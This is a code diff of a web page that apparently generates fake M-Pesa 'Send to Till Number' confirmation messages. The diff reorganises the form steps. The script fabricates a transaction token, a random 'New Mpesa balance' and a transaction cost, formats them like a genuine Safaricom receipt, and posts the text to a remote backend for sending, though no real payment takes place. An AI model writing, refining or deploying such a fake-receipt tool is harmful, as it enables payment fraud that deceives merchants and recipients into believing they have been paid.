@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,9 +20,12 @@ body {
 }
 .content { padding: 30px 25px; }
 h2 { text-align: center; color: #ffffff; margin: 0 0 30px; font-size: 24px; font-weight: 600; }
-label { 
-  display: block; margin: 20px 0 8px; font-weight: 600; color: #cccccc; font-size: 16px;
+.step-label {
+  display: none !important;
+  margin: 20px 0 8px; font-weight: 600; color: #cccccc; font-size: 16px;
+  text-align: center; padding: 8px 0;
 }
+.step-label.active { display: block !important; }
 input, button { 
   width: 100%; padding: 16px 20px; margin-bottom: 10px; border-radius: 12px; 
   font-size: 18px; transition: all 0.3s ease; display: none;
@@ -75,45 +77,44 @@ pre {
   input, button { padding: 18px 16px; font-size: 17px; }
   h2 { font-size: 22px; }
 }
-
 @media (max-height: 600px) {
   .content { padding: 20px 20px; }
-  label { margin: 15px 0 6px; }
+  .step-label { margin: 15px 0 6px; }
 }
 </style>
 </head>
 <body>
 <div class="container">
   <div class="content">
-    <h2></h2>
+    <h2>Send to Till Number</h2>
 
-    <!-- Step 1: Phone -->
-    <label id="phoneLabel">Enter till no</label>
-    <input type="tel" id="phone" placeholder="" class="active">
-    <button id="phoneOkBtn" class="active">ok</button>
+    <!-- Step 1: Till Number -->
+    <div class="step-label active" id="phoneLabel">Enter till no</div>
+    <input type="tel" id="phone" placeholder="e.g. 123456" class="active">
+    <button id="phoneOkBtn" class="active">OK</button>
 
     <!-- Step 2: Amount -->
-    <label id="amountLabel">Enter Amount</label>
-    <input type="number" id="amount" placeholder="" inputmode="numeric">
-    <button id="amountOkBtn">Ok</button>
+    <div class="step-label" id="amountLabel">Enter Amount</div>
+    <input type="number" id="amount" placeholder="e.g. 1000" step="0.01">
+    <button id="amountOkBtn">OK</button>
 
     <!-- Step 3: Name -->
-    <label id="nameLabel"></label>
-    <input type="text" id="name" placeholder="Enter name">
+    <div class="step-label" id="nameLabel">Enter Account Name</div>
+    <input type="text" id="name" placeholder="Enter account holder name">
     <button id="nameOkBtn">OK</button>
 
-    <!-- Step 4: Pochi/Till -->
+    <!-- Step 4: Till Confirmation -->
     <div class="radio-group" id="phoneOptionContainer">
+      <div class="step-label">Confirm: Sending to Till</div>
       <label id="pochiLabel" class="selected">
         <input type="radio" name="includePhone" value="pochi" checked> 
-       Sending to  Till Number
+        Sending to Till Number
       </label>
     </div>
 
-    <!-- Step 5: Send button -->
+    <!-- Step 5: Send -->
     <button id="sendBtn">Send Money</button>
 
-    <h3></h3>
     <pre id="output"></pre>
   </div>
 </div>
@@ -121,18 +122,27 @@ pre {
 <script>
 const API = "https://mpesa-1-mc8e.onrender.com";
 
-const phoneInput = document.getElementById("phone");
-const phoneLabel = document.getElementById("phoneLabel");
-const phoneOkBtn = document.getElementById("phoneOkBtn");
-const amountInput = document.getElementById("amount");
-const amountLabel = document.getElementById("amountLabel");
-const amountOkBtn = document.getElementById("amountOkBtn");
-const nameInput = document.getElementById("name");
-const nameLabel = document.getElementById("nameLabel");
-const nameOkBtn = document.getElementById("nameOkBtn");
-const sendBtn = document.getElementById("sendBtn");
-const output = document.getElementById("output");
-const phoneOptionContainer = document.getElementById("phoneOptionContainer");
+const elements = {
+  phone: { 
+    input: document.getElementById("phone"), 
+    btn: document.getElementById("phoneOkBtn"), 
+    label: document.getElementById("phoneLabel") 
+  },
+  amount: { 
+    input: document.getElementById("amount"), 
+    btn: document.getElementById("amountOkBtn"), 
+    label: document.getElementById("amountLabel") 
+  },
+  name: { 
+    input: document.getElementById("name"), 
+    btn: document.getElementById("nameOkBtn"), 
+    label: document.getElementById("nameLabel") 
+  },
+  options: document.getElementById("phoneOptionContainer"),
+  send: document.getElementById("sendBtn"),
+  output: document.getElementById("output")
+};
+
 const pochiLabel = document.getElementById("pochiLabel");
 
 /* ================= HELPERS ================= */
@@ -152,73 +162,89 @@ function formatDateTime(){
        + d.toLocaleTimeString([], {hour:'numeric',minute:'2-digit'});
 }
 
-/* ================= HIDE PREVIOUS STEP ================= */
-function hidePreviousStep(input, label, okBtn) {
-  input.classList.remove("active");
-  label.style.display = "none";
-  okBtn.classList.remove("active");
+function showStep(step) {
+  // Hide ALL labels first
+  document.querySelectorAll('.step-label').forEach(label => {
+    label.classList.remove('active');
+  });
+  
+  // Hide all inputs/buttons
+  Object.values(elements).forEach(el => {
+    if (typeof el === 'object' && el.input) el.input.classList.remove('active');
+    if (typeof el === 'object' && el.btn) el.btn.classList.remove('active');
+    if (el === elements.options || el === elements.send) el.classList.remove('active');
+  });
+  
+  // Show ONLY current step
+  if (step === 'phone') {
+    elements.phone.input.classList.add('active');
+    elements.phone.btn.classList.add('active');
+    elements.phone.label.classList.add('active');
+    elements.phone.input.focus();
+  } else if (step === 'amount') {
+    elements.amount.input.classList.add('active');
+    elements.amount.btn.classList.add('active');
+    elements.amount.label.classList.add('active');
+    elements.amount.input.focus();
+  } else if (step === 'name') {
+    elements.name.input.classList.add('active');
+    elements.name.btn.classList.add('active');
+    elements.name.label.classList.add('active');
+    elements.name.input.focus();
+  } else if (step === 'options') {
+    elements.options.classList.add('active');
+    elements.send.classList.add('active');
+  }
 }
 
-/* ================= RADIO BUTTON HANDLER ================= */
+function resetForm() {
+  // Clear values
+  elements.phone.input.value = "";
+  elements.amount.input.value = "";
+  elements.name.input.value = "";
+  elements.output.textContent = "";
+  showStep('phone');
+}
+
+// Initialize first step
+showStep('phone');
+
+/* ================= STEP EVENT LISTENERS ================= */
+elements.phone.btn.addEventListener("click", async ()=>{
+  const tillNo = elements.phone.input.value.trim();
+  if(!tillNo || tillNo.length < 6) return alert("Enter valid till number (6+ digits)");
+  
+  showStep('amount');
+});
+
+elements.amount.btn.addEventListener("click", ()=>{
+  const amount = parseFloat(elements.amount.input.value);
+  if(!amount || amount <= 0 || amount > 50000) return alert("Enter valid amount (1-50,000)");
+  showStep('name');
+});
+
+elements.name.btn.addEventListener("click", ()=>{
+  if(!elements.name.input.value.trim()) return alert("Enter account holder name");
+  showStep('options');
+});
+
+/* ================= TILL CONFIRMATION ================= */
 pochiLabel.addEventListener("click", () => {
   pochiLabel.classList.add("selected");
 });
 
-/* ================= STEP 1: PHONE ================= */
-phoneOkBtn.addEventListener("click", async ()=>{
-  const phone = phoneInput.value.trim();
-  if(!phone || phone.length < 10) return alert("Enter valid phone number");
-
-  try {
-    const res = await fetch(`${API}/lookup/${phone}`);
-    const data = await res.json();
-
-    if(data.found){
-      nameInput.value = data.name;
-    } else {
-      nameInput.value = "";
-    }
-  } catch(e) {
-    console.error("Lookup failed:", e);
+/* ================= SEND ================= */
+elements.send.addEventListener("click", async ()=>{
+  const tillNo = elements.phone.input.value.trim();
+  const amount = parseFloat(elements.amount.input.value);
+  const name = elements.name.input.value.trim();
+  
+  if(!tillNo || !amount || amount <=0 || !name) {
+    return alert("Complete all fields");
   }
 
-  hidePreviousStep(phoneInput, phoneLabel, phoneOkBtn);
-  amountInput.classList.add("active");
-  amountLabel.style.display = "block";
-  amountOkBtn.classList.add("active");
-});
-
-/* ================= STEP 2: AMOUNT ================= */
-amountOkBtn.addEventListener("click", ()=>{
-  const amount = parseFloat(amountInput.value);
-  if(!amount || amount <= 0 || amount > 50000) return alert("Enter valid amount (1-50,000)");
-
-  hidePreviousStep(amountInput, amountLabel, amountOkBtn);
-  nameInput.classList.add("active");
-  nameLabel.style.display = "block";
-  nameOkBtn.classList.add("active");
-});
-
-/* ================= STEP 3: NAME ================= */
-nameOkBtn.addEventListener("click", ()=>{
-  if(!nameInput.value.trim()) return alert("Enter recipient name");
-  
-  hidePreviousStep(nameInput, nameLabel, nameOkBtn);
-  phoneOptionContainer.classList.add("active");
-  sendBtn.classList.add("active");
-});
-
-/* ================= STEP 5: SEND ================= */
-sendBtn.addEventListener("click", async ()=>{
-  const phone = phoneInput.value.trim();
-  const amount = parseFloat(amountInput.value);
-  const name = nameInput.value.trim();
-  
-  if(!phone || !amount || amount <=0) return alert("Complete all fields");
-  if(!name) return alert("Enter recipient name");
-
-  sendBtn.disabled = true;
-  sendBtn.textContent = "Sending...";
+  elements.send.disabled = true;
+  elements.send.textContent = "Sending...";
 
   try {
     const cost = calculateCost(amount);
@@ -226,9 +252,9 @@ sendBtn.addEventListener("click", async ()=>{
     const balance = randomBalance();
     const datetime = formatDateTime();
 
-    const message = `${token} Confirmed. Ksh${amount.toFixed(2)} sent to ${name} on ${datetime}. New Mpesa balance is Ksh${balance}. Transaction cost, Ksh${cost.toFixed(2)}. Amount you can transact within the day is 499,960.00.Sign up for Lipa Na M-PESA Till online https://m-pesaforbusiness.co.ke`;
+    const message = `${token} Confirmed. Ksh${amount.toFixed(2)} sent to ${name} (Till: ${tillNo}) on ${datetime}. New Mpesa balance is Ksh${balance}. Transaction cost, Ksh${cost.toFixed(2)}. Amount you can transact within the day is 499,960.00.Sign up for Lipa Na M-PESA Till online https://m-pesaforbusiness.co.ke`;
 
-    const payload = { phone, name, amount, cost, message, token };
+    const payload = { phone: tillNo, name, amount, cost, message, token, type: "till" };
     const res = await fetch(`${API}/send`, {
       method: "POST",
       headers: {"Content-Type":"application/json"},
@@ -237,12 +263,14 @@ sendBtn.addEventListener("click", async ()=>{
     const data = await res.json();
     
     if(data.error) throw new Error(data.error);
-    output.textContent = message;
+    
+    elements.output.textContent = message;
+    setTimeout(resetForm, 2000); // Auto reset after 2s
   } catch(error) {
     alert(error.message || "Transaction failed");
   } finally {
-    sendBtn.disabled = false;
-    sendBtn.textContent = "Send Money";
+    elements.send.disabled = false;
+    elements.send.textContent = "Send Money";
   }
 });
 </script>
